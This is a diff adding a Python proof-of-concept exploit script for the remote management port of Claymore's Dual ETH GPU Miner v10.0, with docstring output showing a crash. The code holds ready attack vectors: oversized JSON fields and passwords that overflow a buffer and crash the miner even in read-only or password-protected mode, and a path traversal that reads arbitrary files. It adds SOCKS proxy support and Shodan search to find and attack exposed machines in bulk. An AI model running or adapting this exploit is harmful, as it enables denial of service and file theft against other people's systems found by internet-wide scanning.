@@ -1,0 +1,248 @@
+#!/usr/bin/env python
+# -*- coding: UTF-8 -*-
+# github.com/tintinweb
+#
+#
+# optional: pip install pysocks (https://pypi.python.org/pypi/PySocks)
+#
+#
+'''
+
+API overview:
+    # >nc -L -p 3333
+    {"id":0,"jsonrpc":"2.0","method":"miner_getstat1"}
+    {"id":0,"jsonrpc":"2.0","method":"miner_file","params":["epools.txt","<encoded>"]}
+    {"id":0,"jsonrpc":"2.0","method":"miner_getfile","params":["config.txt"]}
+    {"id":0,"jsonrpc":"2.0","method":"miner_restart"}
+    {"id":0,"jsonrpc":"2.0","method":"miner_reboot"}
+    {"id":0,"jsonrpc":"2.0","method":"control_gpu","params":["0", "1"]}
+    {"id":0,"jsonrpc":"2.0","method":"control_gpu","params":["-1", "0"]}
+    {"id":0,"jsonrpc":"2.0","method":"control_gpu","params":["0", "2"]}
+    {"id":0,"jsonrpc":"2.0","method":"miner_file","params":["config.txt","<encoded>"]}
+    {"id":0,"jsonrpc":"2.0","method":"miner_file","params":["dpools.txt","<encoded>"]}
+
+
+Exec:
+    #> EthDcrMiner64.exe -epool http://192.168.0.1:8545 -mport -3333
+
+    ╔════════════════════════════════════════════════════════════════╗
+    ║     Claymore's Dual ETH + DCR/SC/LBC/PASC GPU Miner v10.0      ║
+    ╚════════════════════════════════════════════════════════════════╝
+
+    ...
+    Total cards: 1
+    ETH - connecting to 192.168.0.1:8545
+    DUAL MINING MODE ENABLED: ETHEREUM+DECRED
+     DCR: Stratum - connecting to 'pasc-eu2.nanopool.org' <213.32.29.168> port 15555
+    ETH: HTTP SOLO mode
+    Ethereum HTTP requests time (-etht) is set to 200 ms
+    Watchdog enabled
+    Remote management (READ-ONLY MODE) is enabled on port 3333
+
+     DCR: Stratum - Connected (pasc-eu2.nanopool.org:15555)
+     DCR: Authorized
+     DCR: 11/22/17-22:05:12 - New job from pasc-eu2.nanopool.org:15555
+
+    ... <run poc.py --vector=method <target>>
+
+    GPU0 t=57C fan=0%
+    Remote management: unknown command miner_getstat1 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+    .... <crash>
+
+
+PoC:
+    #> poc.py 127.0.0.1:3333
+    [poc.py -             <module>() ][    INFO] --start--
+    [poc.py -             <module>() ][    INFO] # Claymore's Dual ETH + DCR/SC/LBC/PASC GPU Miner - Remote Buffer Overwrite
+    [poc.py -             <module>() ][    INFO] # github.com/tintinweb
+    [poc.py -         iter_targets() ][ WARNING] shodan apikey missing! shodan support disabled.
+    [poc.py -             <module>() ][    INFO] [i] Target: 127.0.0.1:3333
+    [poc.py -             <module>() ][    INFO] [+] connected.
+    [poc.py -             <module>() ][    INFO] [+] peer disappeared. vulnerable!
+    [poc.py -             <module>() ][ WARNING] error(10054, 'Eine vorhandene Verbindung wurde vom Remotehost geschlossen')
+    [poc.py -             <module>() ][    INFO] --done--
+
+
+'''
+
+import logging
+import json
+import time
+import argparse
+import socket
+try:
+    import socks
+except ImportError:
+    print "!! cannot import socks. no socks support!"
+    socks = None
+try:
+    import shodan
+except ImportError:
+    print "!! cannot import shodan. no shodan support!"
+    shodan = None
+
+LOGGER = logging.getLogger(__name__)
+
+class MinerRpc(object):
+    """
+    Generic MinerRpc class with socks support
+    """
+
+    def __init__(self):
+        self.sock = None
+
+    def connect(self, host, port, proxy=None, timeout=15):
+        if socks:
+            self.sock = socks.socksocket()
+        else:
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.settimeout(timeout)
+        if proxy:
+            if not socks:
+                raise Exception("socks support disabled due to unmet dependency. please install pysocks")
+            self.sock.set_proxy(*proxy)
+        return self.sock.connect((host, port))
+
+    def sendRcv(self, msg, chunksize=4096):
+        self.sock.sendall(msg)
+        chunks = []
+        chunk = None
+        #time.sleep(2)
+        while chunk is None or len(chunk)==chunksize:
+            chunk = self.sock.recv(chunksize)
+            chunks.append(chunk)
+        return "".join(chunks)
+
+    def sendRcvTimed(self, msg, chunksize=1):
+        self.sock.sendall(msg)
+        start = time.time()
+        resp = self.sock.recv(chunksize)
+        diff = time.time()-start
+        return diff, resp
+
+
+class Utils:
+    """
+    Utility namespace
+    """
+
+    @staticmethod
+    def iter_targets(targets, shodan_apikey):
+        shodan_api = None
+        if not shodan:
+            LOGGER.warning(
+                "[i] starting without shodan support. please pip install shodan to use shodan search strings.")
+        else:
+            if not shodan_apikey:
+                LOGGER.warning("shodan apikey missing! shodan support disabled.")
+            else:
+                shodan_api = shodan.Shodan(shodan_apikey)
+
+        for target in targets:
+            if target.startswith("shodan://"):
+                target = target.replace("shodan://", "")
+                if shodan_api:
+                    for t in shodan_api.search(target)['matches']:
+                        yield t['ip_str'], t['port']
+            else:
+                host,port = target.strip().split(":")
+                yield host,int(port)
+
+
+VECTORS = {
+    # Vector: extrafield
+    # Description: overly long value for field. overly long overall msg
+    # Result: crashes always, even though
+    #   * password required
+    #   * readonly mode (-<port>)
+    "extrafield" : {"id": 1,
+                     "jsonrpc": "2.0",
+                     "lol": "a" * 145000,  ##<<--
+                     "method": "miner_getstat1 ", },
+    # Vector: psw (basically same as extrafield)
+    # Description: overly long value for psw. overly long overall msg
+    # Result: crashes always, even though
+    #   * password required
+    #   * readonly mode (-<port>)
+    "psw" : { "id": 1,
+              "psw":"d"*145000,  ##<<--
+              "jsonrpc": "2.0",
+              "method": "miner_getstat1", },
+    # Vector: method
+    # Description: overly long value for field. overly long overall msg
+    # Result: crashes always, even though
+    #   * readonly mode (-<port>)
+    "method" : {"id": 1,
+                     "jsonrpc": "2.0",
+                     "method": "miner_getstat1 " + "a" * (16384 - 50 - 15 - 5), },  ##<<--
+    # Vector: traversal
+    # Description: path traversal
+    # Result: retrieves any file
+    "traversal": {"id":0,
+             "jsonrpc":"2.0",
+             "method":"miner_getfile",
+             "params":["../Claymore.s.Dual.Ethereum.Decred_Siacoin_Lbry_Pascal.AMD.NVIDIA.GPU.Miner.v10.0/config.txt"]}, ##<<-- adjust path
+
+
+}
+
+if __name__ == "__main__":
+    logging.basicConfig(format='[%(filename)s - %(funcName)20s() ][%(levelname)8s] %(message)s',
+                        loglevel=logging.DEBUG)
+    LOGGER.setLevel(logging.DEBUG)
+
+    usage = """poc.py [options]
+
+                  example: poc.py [options] <target> [<target>, ...]
+
+                  options:
+                           apikey       ... optional shodan apikey
+                           vector       ... method ... overflow in method, requires password if set [readonly]
+                                            extrafield  ... overflow in non-standard field [readonly, passwd mode]
+                                            psw ... overflow in password
+                                            traversal ... relative path traversal [authenticated]
+
+                  target   ... IP, FQDN or shodan://<search string>
+
+                           #> poc.py 1.1.1.1
+                           #> poc.py 1.2.3.4 "shodan://product:eth+result"
+               """
+
+    parser = argparse.ArgumentParser(usage=usage)
+    parser.add_argument("-a", "--apikey",
+                        dest="apikey", default=None,
+                        help="shodan.io apikey, NotSet=disabled [default: None]")
+    parser.add_argument("-m", "--vector",
+                        dest="vector", default="method",
+                        help="vulnerablevectors [default: method]")
+    parser.add_argument("targets", nargs="+")
+
+    options = parser.parse_args()
+    LOGGER.info("--start--")
+    LOGGER.info("# Claymore's Dual ETH + DCR/SC/LBC/PASC GPU Miner - Remote Buffer Overwrite")
+    LOGGER.info("# github.com/tintinweb")
+    m = MinerRpc()
+
+    for ip, port in Utils.iter_targets(options.targets, options.apikey):
+        LOGGER.info("[i] Target: %s:%s"%(ip, port))
+
+        try:
+            m.connect(ip, port, timeout=20)
+            LOGGER.info("[+] connected.")
+
+            resp = m.sendRcv(json.dumps(VECTORS[options.vector]))  # crash with readonly mode
+
+            LOGGER.debug("<-- %d %r"%(len(resp), resp))
+            if not len(resp):
+                LOGGER.info("[+] did not receive a response. probably vulnerable.")
+        except socket.error, e:
+            if e[0]==10054:
+                LOGGER.info("[+] peer disappeared. vulnerable!")
+            LOGGER.warning(repr(e))
+
+    LOGGER.info("--done--")
